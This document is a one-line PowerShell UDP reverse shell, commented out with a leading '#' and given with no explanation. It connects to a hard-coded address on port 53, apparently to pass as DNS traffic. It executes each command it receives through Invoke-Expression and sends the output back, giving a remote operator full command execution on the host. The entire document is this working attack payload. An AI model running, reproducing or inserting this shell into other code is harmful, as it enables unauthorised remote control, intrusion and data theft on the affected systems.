﻿#$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("192.168.254.226"),53);$client = New-Object System.Net.Sockets.UDPClient(53);[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes('PS> ');$client.Send($sendbytes,$sendbytes.Length,$endpoint);while($true){;$receivebytes = $client.Receive([ref]$endpoint);$returndata = ([text.encoding]::ASCII).GetString($receivebytes);$sendback = (iex $returndata 2>&1 | Out-String );$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback);$client.Send($sendbytes,$sendbytes.Length,$endpoint)};$client.Close()